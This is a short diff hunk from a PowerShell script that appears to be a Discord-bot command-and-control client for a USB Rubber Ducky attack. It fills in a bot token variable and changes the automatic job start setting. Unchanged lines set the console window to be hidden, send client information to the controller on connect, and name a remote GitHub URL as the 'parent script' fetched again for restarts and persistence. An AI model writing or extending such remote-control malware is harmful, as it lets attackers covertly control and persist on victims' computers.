@@ -18,13 +18,13 @@
 -------------------------------------------------------------------------------------------------
 #>
 # =====================================================================================================================================================
-$global:token = "" # make sure your bot is in ONE server only
+$global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
-$defaultstart = 1 # Option to start all jobs automatically upon running
+$defaultstart = 0 # Option to start all jobs automatically upon running
 $parent = "https://raw.githubusercontent.com/xdep/USB-Rubber-Ducky/master/c2client.ps1" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
